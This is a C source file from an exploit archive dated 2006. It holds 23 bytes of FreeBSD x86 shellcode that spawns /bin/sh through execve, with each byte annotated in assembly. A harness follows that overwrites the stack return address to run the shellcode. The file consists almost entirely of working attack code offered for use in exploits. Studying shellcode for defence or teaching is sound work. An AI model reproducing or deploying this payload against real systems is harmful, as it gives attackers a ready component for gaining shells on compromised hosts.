/*

 *
 * FreeBSD_x86-execve_sh-23b-iZ.c (Shellcode, execve /bin/sh, 23 bytes)
 *
 * by IZ <guerrilla.sytes.net>
 *
 */


char setreuidcode[] =

"\x31\xc0"                  /* xor %eax,%eax */
"\x50"                      /* push %eax */
"\x68\x2f\x2f\x73\x68"      /* push $0x68732f2f (//sh) */
"\x68\x2f\x62\x69\x6e"      /* push $0x6e69622f (/bin)*/

"\x89\xe3"                  /* mov %esp,%ebx */
"\x50"                      /* push %eax */
"\x54"                      /* push %esp */
"\x53"                      /* push %ebx */

"\x50"                      /* push %eax */
"\xb0\x3b"                  /* mov $0x3b,%al */
"\xcd\x80";                 /* int $0x80 */


void main()
{
     int*     ret;

     ret = (int*) &ret + 2;

     printf("len %d\n",strlen(setreuidcode));

     (*ret) = (int) setreuidcode;
}

// milw0rm.com [2006-04-14]